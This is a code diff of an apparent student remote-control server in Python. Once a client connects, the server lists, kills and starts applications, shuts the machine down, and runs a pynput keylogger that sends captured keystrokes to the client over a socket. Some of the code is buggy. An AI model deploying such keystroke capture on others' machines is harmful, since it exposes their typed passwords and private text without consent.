@@ -13,9 +13,8 @@ def Server_Running():
     client, addr = server.accept()
     print('Connected by', addr)
 
-
-
     #Function cho server:
+
     def App_running(HOST, PORT):
         import subprocess
         cmd = 'powershell "Get-Process |where {$_.mainWindowTItle} |Select-Object id, name, @{Name=\'ThreadCount\';Expression ={$_.Threads.Count}}| format-table'
@@ -70,132 +69,131 @@ def Server_Running():
             return 1
         except:
             return 0
-
-            
     def hook():
         from threading import Thread
         import threading
         import pynput
         import time
         from pynput.keyboard import Key, Listener, Controller
+
         keyboard = Controller()
         keys = []
         KeyStop = True
+
         def Stop():
             nonlocal KeyStop
-            if KeyStop == True:
-                try:
-                    while True:                       
-                        check = client.recv(1024).decode("utf8")
-                        print(check)
-                        if check == "Unhook Key" or check =="Xem key":                 
-                            KeyStop = False
-                            break
-                finally:
-                    keyboard.release(Key.space)
-
+            while True:
+                if KeyStop == True:
+                    try:
+                        while True:                       
+                            check = client.recv(1024).decode("utf8")
+                            print(check)
+                            if check == "Unhook Key":                 
+                                KeyStop = False
+                                break
+                    finally:
+                        keyboard.release(Key.space)
+                break
         t1 = threading.Thread(target=Stop)
         def KeyLogger():
-            def on_press(key):
-                nonlocal keys
-                keys.append(key)
-            def on_release(key):
-                if KeyStop == False: listener.stop()
-            with Listener(on_release = on_release, on_press = on_press) as listener:
-                t1.join()
-                listener.join()
-            def write(keys):
-                global count
-                count = 0
-                keylog = ''
-                for key in keys:
-                    k = str(key).replace("'","")
-                    if(str(k) == "Key.backspace"):
-                        k = "Backspace"
-                    elif(str(k) == "Key.space"):
-                        k = " "                
-                    k = str(k).replace("Key.cmd","")                    
-                    k = str(k).replace("Key.","")
-                    k = str(k).replace("<","")
-                    k = str(k).replace(">","")
-                    if(str(k) == 96):
-                        k = "0"
-                    elif(str(k) == 97):
-                        k = "1"
-                    elif(str(k) == 98):
-                        k = "2"
-                    elif(str(k) == 99):
-                        k = "3"
-                    elif(str(k) == 100):
-                        k = "4"
-                    elif(str(k) == 101):
-                        k = "5"
-                    elif(str(k) == 102):
-                        k = "6"
-                    elif(str(k) == 103):
-                        k = "7"
-                    elif(str(k) == 104):
-                        k = "8"
-                    elif(str(k) == 105):
-                        k = "9"
-                    k = str(k).replace("cmd","fn")
-                    k = str(k).replace("enter","Enter")
-                    k = str(k).replace("tab","")
-                    k = str(k).replace("esc","ESC")
-                    k = str(k).replace("num_lock","")
-                    k = str(k).replace("caps_lock","")
-                    k = str(k).replace("shift_l","")
-                    k = str(k).replace("shift_r","")
-                    k = str(k).replace("ctrl_l","")
-                    k = str(k).replace("ctrl_r","")
-                    k = str(k).replace("alt_l","")
-                    k = str(k).replace("alt_gr","")
-                    k = str(k).replace("delete","Del")
-                    k = str(k).replace("print_screen","PrtSc")
-                    k = str(k).replace("home","Home")
-
-                    keylog += k
-                    count+=1
-                return keylog[0:]
-            data = write(keys)
-            print(data)
-            client.sendall(bytes(str(count),"utf8"))
-            client.sendall(bytes(data,"utf8"))
-            check = client.recv(1024).decode("utf8")
-            keys.clear()
-            
+            while True:
+                def on_press(key):
+                    nonlocal keys
+                    keys.append(key)
+                def on_release(key):
+                    if KeyStop == False: listener.stop()
+                with Listener(on_release = on_release, on_press = on_press) as listener:
+                    listener.join()
+                def write(keys):
+                    global count
+                    count = 0
+                    keylog = ''
+                    for key in keys:
+                        k = str(key).replace("'","")
+                        if(str(k) == "Key.backspace"):
+                            k = " Backspace "
+                        elif(str(k) == "Key.space"):
+                            k = " "                
+                        k = str(k).replace("Key.cmd","")                    
+                        k = str(k).replace("Key.","")
+                        k = str(k).replace("<","")
+                        k = str(k).replace(">","")
+                        if(str(k) == 96):
+                            k = "0"
+                        elif(str(k) == 97):
+                            k = "1"
+                        elif(str(k) == 98):
+                            k = "2"
+                        elif(str(k) == 99):
+                            k = "3"
+                        elif(str(k) == 100):
+                            k = "4"
+                        elif(str(k) == 101):
+                            k = "5"
+                        elif(str(k) == 102):
+                            k = "6"
+                        elif(str(k) == 103):
+                            k = "7"
+                        elif(str(k) == 104):
+                            k = "8"
+                        elif(str(k) == 105):
+                            k = "9"
+                        k = str(k).replace("cmd","fn")
+                        k = str(k).replace("enter","Enter")
+                        k = str(k).replace("tab","")
+                        k = str(k).replace("esc","ESC")
+                        k = str(k).replace("num_lock","")
+                        k = str(k).replace("caps_lock","")
+                        k = str(k).replace("shift_l","")
+                        k = str(k).replace("shift_r","")
+                        k = str(k).replace("ctrl_l","")
+                        k = str(k).replace("ctrl_r","")
+                        k = str(k).replace("alt_l","")
+                        k = str(k).replace("alt_gr","")
+                        k = str(k).replace("delete","Del")
+                        k = str(k).replace("print_screen","PrtSc")
+                        k = str(k).replace("home","Home")
+                        keylog += k
+                        count+=1
+                    return keylog[0:]
+                data = write(keys)
+                client.sendall(bytes(str(count),"utf8"))
+                check = client.recv(1024).decode("utf8")
+                client.sendall(bytes(data,"utf8"))
+                check = client.recv(1024).decode("utf8")
+                keys.clear()
+                break
         t2 = threading.Thread(target=KeyLogger)
         t1.start()
         t2.start()
-
+        t2.join()
     def Recieve_Close():
         import os
         os.system('shutdown -s -t "time"')
         #time la thoi gian set up tat may tuy y
+
     #Command cho server:
     while True:
-        #try:
-        def Command_catch(i):
-            if i == "Xem App": App_running(HOST,PORT)
-            elif i == "Xoa App": 
-                ID_App = client.recv(1024).decode("utf8") 
-                App_running_kill(ID_App)
-            elif i == "Bat App":
-                Name = client.recv(1024).decode("utf8")
-                App_start(Name)
-            elif i == "Hook Key": hook()
-            elif i == "Shutdown" : Recieve_Close()
-
-        Command = client.recv(1024).decode("utf8")
-        client.sendall(bytes("OK","utf8"))
-        print(Command)
-        Command_catch(Command)
-        #except:
-            #print("Disconnected")
-            #break
+        try:
+            def Command_catch(i):
+                if i == "Xem App": App_running(HOST,PORT)
+                elif i == "Xoa App": 
+                    ID_App = client.recv(1024).decode("utf8") 
+                    App_running_kill(ID_App)
+                elif i == "Bat App":
+                    Name = client.recv(1024).decode("utf8")
+                    App_start(Name)
+                elif i == "Hook Key": hook()
+                elif i == "Shutdown" : Recieve_Close()
+            Command = client.recv(1024).decode("utf8")
+            client.sendall(bytes("Da nhan lenh","utf8"))
+            print(Command)
+            Command_catch(Command)
+        except:
+            print("Disconnected")
+            break
     server.close()
-
-    
+  
 from tkinter import *
 from tkinter import messagebox
 
@@ -210,7 +208,5 @@ Start = Button(
         borderwidth=5,
         command = Server_Running
     ).pack()
-
-
 
 mainWin.mainloop()
